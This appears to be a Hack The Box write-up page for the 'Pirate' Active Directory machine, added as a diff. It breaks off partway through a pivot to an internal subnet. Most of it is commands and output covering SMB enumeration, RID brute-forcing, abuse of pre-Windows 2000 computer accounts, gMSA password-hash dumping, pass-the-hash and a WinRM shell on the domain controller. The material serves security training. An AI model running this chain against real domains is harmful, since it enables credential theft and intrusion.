@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Pirate | Paracausal Telemetry</title><meta name="description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Pre 2000 computer accounts, Compromising gMSA_ADCS_prod$ and…" /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-pirate/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Pirate" /><meta property="og:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Pre 2000 computer accounts, Compromising gMSA_ADCS_prod$ and…" /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-pirate/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-pirate/og.png?v=970de4ee" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Pirate" /><meta name="twitter:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Pre 2000 computer accounts, Compromising gMSA_ADCS_prod$ and…" /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-pirate/og.png?v=970de4ee" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Pirate","description":"Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Pre 2000 computer accounts, Compromising gMSA_ADCS_prod$ and…","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-pirate/","datePublished":"2026-09-24","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Pirate","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-pirate/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Pirate</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-09-24 · 20 min read</p><h1>Pirate</h1><p>Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Pre 2000 computer accounts, Compromising gMSA_ADCS_prod$ and gMSA_ADFS_prod$.</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · hard</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Pirate" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-pirate.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-pirate.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Pirate</h2><p>Pirate is a hard-difficulty Windows machine centered on an Active Directory chain where nearly all of the difficulty sits in the enumeration. Starting from assumed-breach credentials, initial enumeration uncovers computer accounts belonging to Pre-Windows 2000 Compatible…</p></div><span class="room-badge room-badge-hard">Hard</span></div><dl class="room-facts"><div><dt>Released</dt><dd>28 Feb 2026</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creator</dt><dd>ruycr4ft</dd></div><div><dt>Rating</dt><dd>4.7 / 5</dd></div><div><dt>User owns</dt><dd>3,973</dd></div><div><dt>Root owns</dt><dd>3,904</dd></div><div><dt>User blood</dt><dd>Pyp<small class="room-blood-time">0H 30M 33S</small></dd></div><div><dt>Root blood</dt><dd>Mojo098<small class="room-blood-time">0H 41M 30S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 3335 votes from easiest to hardest"><rect x="0" y="60" width="20" height="4" rx="2" fill="hsl(96 70% 55%)"><title>68 votes</title></rect><rect x="26" y="62" width="20" height="2" rx="2" fill="hsl(96 70% 55%)"><title>16 votes</title></rect><rect x="52" y="59" width="20" height="5" rx="2" fill="hsl(80 70% 55%)"><title>96 votes</title></rect><rect x="78" y="53" width="20" height="11" rx="2" fill="hsl(70 70% 55%)"><title>201 votes</title></rect><rect x="104" y="44" width="20" height="20" rx="2" fill="hsl(50 70% 55%)"><title>368 votes</title></rect><rect x="130" y="42" width="20" height="22" rx="2" fill="hsl(38 70% 55%)"><title>416 votes</title></rect><rect x="156" y="0" width="20" height="64" rx="2" fill="hsl(28 70% 55%)"><title>1184 votes</title></rect><rect x="182" y="34" width="20" height="30" rx="2" fill="hsl(16 70% 55%)"><title>549 votes</title></rect><rect x="208" y="51" width="20" height="13" rx="2" fill="hsl(8 70% 55%)"><title>248 votes</title></rect><rect x="234" y="54" width="20" height="10" rx="2" fill="hsl(0 70% 55%)"><title>189 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 7.4, Real-Life 7.4, CVE 4.7, Custom Exploitation 5.3, CTF-Like 2.6"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,58.2 159.3,94.0 129.3,136.6 88.2,140.0 92.7,104.4" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/Pirate" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Machine Description</h2><p>As is common in real life pentests, you will start the Pirate box with credentials for the following account pentest / p3nt3st2025!&amp;</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">pentest:p3nt3st2025!&amp;</code></pre><h2>Host file setup</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo nxc smb 10.129.244.95 --generate-hosts-file /etc/hosts  
+SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)</code></pre><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=2000 -sT -Pn 10.129.244.95 -vv
+
+Nmap scan report for 10.129.244.95
+Host is up, received user-set (0.014s latency).
+Scanned at 2026-09-24 16:27:34 BST for 66s
+Not shown: 65513 filtered tcp ports (no-response)
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack
+80/tcp    open  http             syn-ack
+88/tcp    open  kerberos-sec     syn-ack
+135/tcp   open  msrpc            syn-ack
+139/tcp   open  netbios-ssn      syn-ack
+389/tcp   open  ldap             syn-ack
+445/tcp   open  microsoft-ds     syn-ack
+464/tcp   open  kpasswd5         syn-ack
+593/tcp   open  http-rpc-epmap   syn-ack
+636/tcp   open  ldapssl          syn-ack
+2179/tcp  open  vmrdp            syn-ack
+3268/tcp  open  globalcatLDAP    syn-ack
+3269/tcp  open  globalcatLDAPssl syn-ack
+5985/tcp  open  wsman            syn-ack
+9389/tcp  open  adws             syn-ack
+49667/tcp open  unknown          syn-ack
+49683/tcp open  unknown          syn-ack
+49684/tcp open  unknown          syn-ack
+49686/tcp open  unknown          syn-ack
+49689/tcp open  unknown          syn-ack
+49913/tcp open  unknown          syn-ack
+49936/tcp open  unknown          syn-ack</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 53,80,88,135,139,389,445,464,593,636,2179,3268,3269,5985 -A --min-rate=2000 -sT -Pn dc01.pirate.htb
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-24 16:30 +0100
+Nmap scan report for dc01.pirate.htb (10.129.244.95)
+Host is up (0.014s latency).
+rDNS record for 10.129.244.95: DC01.pirate.htb
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-24 22:30:14Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-09-24T22:31:40+00:00; +7h00m00s from scanner time.
+| ssl-cert: Subject: commonName=DC01.pirate.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.pirate.htb
+| Not valid before: 2026-09-24T22:17:27
+|_Not valid after:  2027-09-24T22:17:27
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-09-24T22:31:40+00:00; +7h00m00s from scanner time.
+| ssl-cert: Subject: commonName=DC01.pirate.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.pirate.htb
+| Not valid before: 2026-09-24T22:17:27
+|_Not valid after:  2027-09-24T22:17:27
+2179/tcp open  vmrdp?
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-09-24T22:31:40+00:00; +7h00m00s from scanner time.
+| ssl-cert: Subject: commonName=DC01.pirate.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.pirate.htb
+| Not valid before: 2026-09-24T22:17:27
+|_Not valid after:  2027-09-24T22:17:27
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.pirate.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.pirate.htb
+| Not valid before: 2026-09-24T22:17:27
+|_Not valid after:  2027-09-24T22:17:27
+|_ssl-date: 2026-09-24T22:31:40+00:00; +7h00m00s from scanner time.
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><h2>SMB (445)</h2><p>Null auth is enabled but cannot use it to enumerate</p><p>The guest account is also disabled</p><h3>Using provided credentials</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.pirate.htb -u pentest -p &#39;p3nt3st2025!&amp;&#39;
+SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.95   445    DC01             [+] pirate.htb\pentest:p3nt3st2025!&amp; </code></pre><p>These credentials allow me to authenticate</p><h4>Shares</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.pirate.htb -u pentest -p &#39;p3nt3st2025!&amp;&#39; --shares
+SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.95   445    DC01             [+] pirate.htb\pentest:p3nt3st2025!&amp; 
+SMB         10.129.244.95   445    DC01             [*] Enumerated shares
+SMB         10.129.244.95   445    DC01             Share           Permissions     Remark
+SMB         10.129.244.95   445    DC01             -----           -----------     ------
+SMB         10.129.244.95   445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.244.95   445    DC01             C$                              Default share
+SMB         10.129.244.95   445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.244.95   445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.129.244.95   445    DC01             SYSVOL          READ            Logon server share</code></pre><p>Just default shares</p><h4>Users</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.pirate.htb -u pentest -p &#39;p3nt3st2025!&amp;&#39; --rid-brute 20000 | grep &#39;(SidTypeUser)&#39; | cut -d &#39;\&#39; -f 2 | cut -d &#39; &#39; -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC01$
+a.white_adm
+a.white
+WEB01$
+MS01$
+EXCH01$
+gMSA_ADCS_prod$
+pentest
+gMSA_ADFS_prod$
+j.sparrow</code></pre><p>Ill use <code>--rid-brute</code> to also get machine accounts</p><h2>Pre 2000 computer accounts</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ldap dc01.pirate.htb -u pentest -p &#39;p3nt3st2025!&amp;&#39; -M pre2k
+LDAP        10.129.244.95   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.244.95   389    DC01             [+] pirate.htb\pentest:p3nt3st2025!&amp; 
+PRE2K       10.129.244.95   389    DC01             Pre-created computer account: MS01$
+PRE2K       10.129.244.95   389    DC01             Pre-created computer account: EXCH01$
+PRE2K       10.129.244.95   389    DC01             [+] Found 2 pre-created computer accounts. Saved to /home/kali/.nxc/modules/pre2k/pirate.htb/precreated_computers.txt
+PRE2K       10.129.244.95   389    DC01             [-] Failed to get TGT for ms01@pirate.htb: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+PRE2K       10.129.244.95   389    DC01             [-] Failed to get TGT for exch01@pirate.htb: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</code></pre><p>After seeing several machine accounts, i figured it was worth checking, looks like there is</p><p>However nxc is unable to get TGTs cause of the clock skew which is fine since i should be able to guess their password based off their username</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.pirate.htb -u &#39;ms01$&#39; -p &#39;ms01&#39;                  
+SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.95   445    DC01             [-] pirate.htb\ms01$:ms01 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
+
+nxc smb dc01.pirate.htb -u &#39;exch01$&#39; -p &#39;exch01&#39;
+SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.95   445    DC01             [-] pirate.htb\exch01$:exch01 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code></pre><p>Both credentials are valid however i am not authorized to use these credentials to logon</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +7h nxc ldap dc01.pirate.htb -u pentest -p &#39;p3nt3st2025!&amp;&#39; -M pre2k
+LDAP        10.129.244.95   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.244.95   389    DC01             [+] pirate.htb\pentest:p3nt3st2025!&amp; 
+PRE2K       10.129.244.95   389    DC01             Pre-created computer account: MS01$
+PRE2K       10.129.244.95   389    DC01             Pre-created computer account: EXCH01$
+PRE2K       10.129.244.95   389    DC01             [+] Found 2 pre-created computer accounts. Saved to /home/kali/.nxc/modules/pre2k/pirate.htb/precreated_computers.txt
+PRE2K       10.129.244.95   389    DC01             [+] Successfully obtained TGT for ms01@pirate.htb
+PRE2K       10.129.244.95   389    DC01             [+] Successfully obtained TGT for exch01@pirate.htb
+PRE2K       10.129.244.95   389    DC01             [+] Successfully obtained TGT for 2 pre-created computer accounts. Saved to /home/kali/.nxc/modules/pre2k/ccache</code></pre><p>However re-running the previous command while syncing to the time it will get some TGTs for me</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +7h nxc smb dc01.pirate.htb --use-kcache
+SMB         dc01.pirate.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc01.pirate.htb 445    DC01             [+] PIRATE.HTB\exch01 from ccache
+
+faketime -f +7h nxc smb dc01.pirate.htb --use-kcache
+SMB         dc01.pirate.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc01.pirate.htb 445    DC01             [+] PIRATE.HTB\ms01 from ccache</code></pre><p>Both allow me to authenticate</p><h2>Compromising <code>gMSA_ADCS_prod$</code> and <code>gMSA_ADFS_prod$</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +7h nxc ldap dc01.pirate.htb --use-kcache --gmsa
+LDAP        dc01.pirate.htb 389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:PIRATE.HTB) (signing:None) (channel binding:Never) 
+LDAP        dc01.pirate.htb 389    DC01             [+] PIRATE.HTB\ms01 from ccache 
+LDAP        dc01.pirate.htb 389    DC01             [*] Getting GMSA Passwords
+LDAP        dc01.pirate.htb 389    DC01             Account: gMSA_ADCS_prod$      NTLM: aa831d274ee80cf2092f68cbcf29093e     PrincipalsAllowedToReadPassword: Domain Secure Servers
+LDAP        dc01.pirate.htb 389    DC01             Account: gMSA_ADFS_prod$      NTLM: e819498ec29f595382df1eaf4fb42307     PrincipalsAllowedToReadPassword: Domain Secure Servers</code></pre><p>I have both NT hashes for both of these accounts</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.pirate.htb -u &#39;gMSA_ADFS_prod$&#39; -H &#39;e819498ec29f595382df1eaf4fb42307&#39;
+SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.95   445    DC01             [+] pirate.htb\gMSA_ADFS_prod$:e819498ec29f595382df1eaf4fb42307
+
+nxc smb dc01.pirate.htb -u &#39;gMSA_ADCS_prod$&#39; -H &#39;aa831d274ee80cf2092f68cbcf29093e&#39;
+SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.95   445    DC01             [+] pirate.htb\gMSA_ADCS_prod$:aa831d274ee80cf2092f68cbcf29093e</code></pre><p>Both users compromised!</p><h2>Access over WINRM </h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc winrm dc01.pirate.htb -u &#39;gMSA_ADCS_prod$&#39; -H &#39;aa831d274ee80cf2092f68cbcf29093e&#39;
+WINRM       10.129.244.95   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) 
+WINRM       10.129.244.95   5985   DC01             [+] pirate.htb\gMSA_ADCS_prod$:aa831d274ee80cf2092f68cbcf29093e (Pwn3d!)
+
+nxc winrm dc01.pirate.htb -u &#39;gMSA_ADFS_prod$&#39; -H &#39;e819498ec29f595382df1eaf4fb42307&#39;
+WINRM       10.129.244.95   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) 
+WINRM       10.129.244.95   5985   DC01             [+] pirate.htb\gMSA_ADFS_prod$:e819498ec29f595382df1eaf4fb42307 (Pwn3d!)</code></pre><p>Both accounts can authenticate</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py -i dc01.pirate.htb -u &#39;gMSA_ADCS_prod$&#39; -H &#39;aa831d274ee80cf2092f68cbcf29093e&#39;
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | &#39; \| &#39;_| &#39;  |___| &#39;_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.6.0
+
+[*] Connecting to &#39;dc01.pirate.htb:5985&#39; as &#39;gMSA_ADCS_prod$&#39;
+evil-winrm-py PS C:\Users\gMSA_ADCS_prod$\Documents&gt;</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Program Files\Hyper-V&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter vEthernet (Switch01):
+
+   Connection-specific DNS Suffix  . : 
+   Link-local IPv6 Address . . . . . : fe80::d976:c606:587e:f1e1%8
+   IPv4 Address. . . . . . . . . . . : 192.168.100.1
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv4 Address. . . . . . . . . . . : 10.129.244.95
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : 10.129.0.1
+evil-winrm-py PS C:\Program Files\Hyper-V&gt; ping 192.168.100.2
+
+Pinging 192.168.100.2 with 32 bytes of data:
+Reply from 192.168.100.2: bytes=32 time&lt;1ms TTL=128
